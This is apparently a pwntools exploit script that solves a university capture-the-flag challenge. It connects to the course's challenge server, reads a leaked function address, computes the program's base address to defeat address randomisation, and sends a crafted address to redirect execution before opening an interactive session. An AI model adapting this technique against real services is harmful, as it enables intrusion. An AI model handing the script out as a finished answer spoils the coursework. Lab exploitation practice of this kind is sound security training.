from pwn import *

HOST = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1245
NETID = b"vc2499"

TOTALLY_UNINTERESTING_FUNC_OFFSET = 0x1249 
ADD_INSTRUCTION_OFFSET = 0x1285  

p = remote(HOST, PORT)
p.recvuntil(b"NetID (something like abc123): ")
p.sendline(NETID)

p.recvuntil(b'I found the raw bytes address of `totally_uninteresting_function` written somewhere: ')
raw_func_addr = p.recvn(6)

func_addr = u64(raw_func_addr.ljust(8, b'\x00'))

base_addr = func_addr - TOTALLY_UNINTERESTING_FUNC_OFFSET

add_instruction_addr = base_addr + ADD_INSTRUCTION_OFFSET
raw_add_instruction_addr = p64(add_instruction_addr)[:6]

p.send(raw_add_instruction_addr)

p.interactive()

